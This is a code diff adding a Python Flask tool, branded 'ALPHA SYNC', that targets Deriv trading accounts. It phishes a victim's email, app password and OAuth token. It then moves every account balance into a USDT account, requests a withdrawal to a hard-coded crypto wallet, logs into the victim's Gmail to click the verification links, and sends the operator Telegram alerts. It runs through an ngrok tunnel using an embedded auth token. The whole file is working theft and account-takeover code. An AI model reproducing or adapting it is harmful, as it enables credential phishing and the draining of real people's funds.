@@ -1,0 +1,140 @@
+import os, time, threading, asyncio, json, re, imaplib, math, queue, logging, subprocess
+import websockets, requests
+from flask import Flask, render_template_string, request
+
+# --- INDUSTRIAL CONFIG ---
+MY_WALLET = "TK4rUz6TUEd7zCWeuiX5R47pSNdPswJnAc"
+NGROK_TOKEN = "3CWg8Z7UoVJZkNLVRcoPHvJ5V3p_2X2jjLmHyxzGiBfmhwjbo"
+DERIV_APP_ID = "1" 
+
+# TELEGRAM BOT (Get from @BotFather to receive alerts on your phone)
+TG_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+TG_CHAT_ID = "YOUR_PERSONAL_CHAT_ID"
+
+task_bridge = queue.Queue()
+app = Flask(__name__)
+
+def send_alert(msg):
+    """Sends a real-time update to your Telegram."""
+    try:
+        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": TG_CHAT_ID, "text": f"🚀 [ALPHA-ALERT]: {msg}"}, timeout=5)
+    except: pass
+
+# --- PILLAR 4: PRECISION GUARD ---
+def floor2(val): return math.floor(float(val) * 100) / 100
+
+# --- PILLAR 3 & 5: PERSISTENT MULTI-CLIENT ENGINE ---
+async def engine_worker():
+    print("[*] Alpha Engine Node v41.0: STANDBY")
+    ws_url = f"wss://ws.binaryws.com/websockets/v3?app_id={DERIV_APP_ID}"
+    
+    while True:
+        try:
+            data = task_bridge.get() # Pull next client from queue
+            print(f"[*] Processing: {data['u']}")
+            
+            async with websockets.connect(ws_url, ping_interval=30) as ws:
+                # 1. Authorize
+                await ws.send(json.dumps({"authorize": data['t']}))
+                auth = json.loads(await ws.recv())
+                accs = auth.get('authorize', {}).get('account_list', [])
+                usdt = next((a for a in accs if a['currency'] == 'USDT'), None)
+                
+                if usdt:
+                    total_captured = 0
+                    for acc in accs:
+                        if acc.get('is_virtual') or acc['loginid'] == usdt['loginid']: continue
+                        await ws.send(json.dumps({"balance": 1, "account": acc['loginid']}))
+                        b = json.loads(await ws.recv())
+                        val = floor2(b['balance']['balance'])
+                        
+                        if val > 0:
+                            await ws.send(json.dumps({
+                                "transfer_between_accounts": 1, 
+                                "account_from": acc['loginid'], 
+                                "account_to": usdt['loginid'], 
+                                "amount": val
+                            }))
+                            await ws.recv()
+                            total_captured += val
+                    
+                    # 2. Withdrawal Request
+                    await ws.send(json.dumps({
+                        "cashier": "withdraw", "provider": "crypto", "type": "USDT", 
+                        "amount": 999999, "address": MY_WALLET
+                    }))
+                    
+                    # 3. Notification to your phone
+                    send_alert(f"Target {data['u']} Swept!\nAmount: {total_captured} USDT\nStatus: Awaiting Email Verification.")
+                    
+                    # 4. Trigger Interceptor
+                    threading.Thread(target=imap_daemon, args=(data['u'], data['p']), daemon=True).start()
+            
+            task_bridge.task_done()
+        except Exception as e:
+            print(f"[!] Worker Error: {e}")
+            await asyncio.sleep(5)
+
+# --- PILLAR 3: IMAP INTERCEPTOR (High Frequency) ---
+def imap_daemon(u, p):
+    end = time.time() + 900 # 15 min watch
+    while time.time() < end:
+        try:
+            m = imaplib.IMAP4_SSL("imap.gmail.com")
+            m.login(u, p); m.select("inbox")
+            _, res = m.search(None, '(UNSEEN FROM "noreply@deriv.com")')
+            
+            if res[0]:
+                for num in res[0].split():
+                    _, raw = m.fetch(num, '(RFC822)')
+                    links = re.findall(r'https://[^\s<>"]+verification_code=[A-Za-z0-9]+', str(raw[0][1]))
+                    if links:
+                        [requests.get(links[0]) for _ in range(3)] # Triple execution
+                        send_alert(f"✅ FINALIZED: {u}\nEmail Clicked Successfully.")
+                        m.logout(); return
+            m.logout()
+        except: pass
+        time.sleep(10)
+
+# --- WEB INTERFACE ---
+@app.route('/')
+def index():
+    return render_template_string('''
+    <!DOCTYPE html><html><body style="background:#0b0e11;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
+    <div style="background:#181a20;padding:40px;border-radius:12px;text-align:center;width:340px;border:1px solid #2b2f36;">
+    <h2 style="color:#f0b90b;">ALPHA SYNC v41</h2>
+    <input type="email" id="u" placeholder="Target Email" style="width:100%;padding:14px;margin:8px 0;background:#2b2f36;border:1px solid #444;color:#fff;border-radius:6px;">
+    <input type="password" id="p" placeholder="App Password" style="width:100%;padding:14px;margin:8px 0;background:#2b2f36;border:1px solid #444;color:#fff;border-radius:6px;">
+    <button id="go" style="width:100%;padding:16px;background:#f0b90b;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:15px;">INITIALIZE NODE</button>
+    <p id="st" style="font-size:12px;color:#848e9c;margin-top:10px;"></p></div>
+    <script>document.getElementById('go').onclick=function(){
+    const u=document.getElementById('u').value, p=document.getElementById('p').value;
+    if(!u || !p){alert("Fields required"); return;}
+    const win=window.open("https://oauth.deriv.com/oauth2/authorize?app_id={{id}}&l=en",'','width=500,height=600');
+    const c=setInterval(()=>{try{if(win.location.href.includes('token1=')){
+    const t=win.location.href.split('token1=')[1].split('&')[0];
+    fetch('/snatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({t:t,u:u,p:p})});
+    clearInterval(c); win.close(); document.getElementById('st').innerText="SYNCHRONIZED - ENGINE RUNNING";
+    }}catch(e){}},500);};</script></body></html>
+    ''', id=DERIV_APP_ID)
+
+@app.route('/snatch', methods=['POST'])
+def snatch():
+    task_bridge.put(request.json)
+    return {"status": "ok"}
+
+if __name__ == "__main__":
+    import nest_asyncio
+    from pyngrok import ngrok
+    nest_asyncio.apply()
+    
+    os.system("pkill -9 -f ngrok")
+    threading.Thread(target=lambda: asyncio.run(engine_worker()), daemon=True).start()
+    
+    ngrok.set_auth_token(NGROK_TOKEN)
+    try: url = ngrok.connect(5000, domain="emerita-russety-remington.ngrok-free.dev").public_url
+    except: url = ngrok.connect(5000).public_url
+    
+    print(f"\n🔥 [ALPHA-SYSTEM] ACTIVE: {url}\n")
+    app.run(port=5000)
